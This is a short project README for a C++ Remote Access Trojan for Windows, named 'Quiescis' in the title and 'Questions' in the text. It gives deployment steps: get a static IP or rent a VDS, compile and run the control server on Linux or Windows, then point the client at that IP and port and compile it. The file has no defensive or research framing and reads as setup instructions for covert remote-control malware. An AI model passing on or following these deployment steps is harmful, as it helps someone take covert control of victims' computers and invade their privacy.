# Quiescis

<b>Questions</b> is a powerful Remote Access Trojan for windows computer on C++

![alt text](img/header.png)

# Installing
## Server
1. Clone this repository 
2. Get a static ip or purchase VDS
3. Server Questions cross platform
   you can run it on linux distributions
   and windows.<br/>

   
   
### <b>Linux distributions</b>:<br/>
   3.1 cd server/server<br/>
   3.2 set Config.h, change PORT<br/>
   3.3 g++ server.cpp -w<br/>
   3.4 ./a.out<br/>
   
### <b>Windows</b>:<br/>
   3.5 cd server<br/>
   3.6 open server.sln in Visual Studio<br/>
   3.7 compile Cntl + F5<br/>
   3.8 server.exe in Debug/<br/>
   
## Client
1. Open in Visual Studio client/client.sln
2. Change IP and PORT in Config.h
3. Compile Cntl + F5
